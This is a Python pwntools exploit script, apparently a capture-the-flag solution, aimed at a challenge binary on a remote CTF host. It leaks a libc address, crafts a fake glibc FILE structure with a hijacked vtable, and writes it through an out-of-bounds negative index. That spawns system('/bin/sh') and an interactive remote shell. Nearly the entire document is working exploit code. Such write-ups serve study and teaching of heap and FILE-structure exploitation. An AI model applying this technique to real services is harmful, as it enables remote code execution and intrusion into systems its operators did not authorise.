"""
Exploit script for 'vuln'

https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/
"""

from pwn import *

# For gdb
#context.terminal = ['tmux', 'splitw', '-h']

# A handy function to craft FILE structures
def pack_file(_flags = 0,
              _IO_read_ptr = 0,
              _IO_read_end = 0,
              _IO_read_base = 0,
              _IO_write_base = 0,
              _IO_write_ptr = 0,
              _IO_write_end = 0,
              _IO_buf_base = 0,
              _IO_buf_end = 0,
              _IO_save_base = 0,
              _IO_backup_base = 0,
              _IO_save_end = 0,
              _IO_marker = 0,
              _IO_chain = 0,
              _fileno = 0,
              _lock = 0):
    struct = p32(_flags) + \
             p32(0) + \
             p64(_IO_read_ptr) + \
             p64(_IO_read_end) + \
             p64(_IO_read_base) + \
             p64(_IO_write_base) + \
             p64(_IO_write_ptr) + \
             p64(_IO_write_end) + \
             p64(_IO_buf_base) + \
             p64(_IO_buf_end) + \
             p64(_IO_save_base) + \
             p64(_IO_backup_base) + \
             p64(_IO_save_end) + \
             p64(_IO_marker) + \
             p64(_IO_chain) + \
             p32(_fileno)
    struct = struct.ljust(0x88, "\x00")
    struct += p64(_lock)
    struct = struct.ljust(0xd8, "\x00")
    return struct

def name(data,p):
    p.sendafter("name: ",data)

def write(index, data,p):
    p.sendlineafter("write: ",str(index))
    p.sendlineafter("data: ",data)


bin = ELF("./back")
libc = ELF("../libc/libc.so.6")

env = {"LD_PRELOAD": os.path.join(os.getcwd(), "../libc/libc.so.6")}
#p = process("./back", env=env)
p = remote("butterfly.darkarmy.xyz",32770)

name('a'*0x50,p)
p.recvuntil('a'*0x50)
libc_base = u64(p.recv(6) + '\x00'*2) - 0x1b39e7
#gdb.attach(p)

rip = libc_base + libc.symbols['system']
rdi = libc_base + next(libc.search("/bin/sh")) # The first param we want

assert(rdi%2 == 0)

io_str_overflow_ptr_addr = libc_base + libc.symbols['_IO_file_jumps'] + 0xd8
fake_vtable_addr = io_str_overflow_ptr_addr - 0x18

file_struct = pack_file(_IO_buf_base = 0,
                        _IO_buf_end = (rdi-100)/2,
                        _IO_write_ptr = (rdi-100)/2,
                        _IO_write_base = 0,
                        _lock = libc_base+0x3eb380)

file_struct += p64(fake_vtable_addr)
file_struct += p64(rip)

file_struct = file_struct.ljust(0xe8, "\x00")
write(-6,file_struct,p) 
p.interactive()
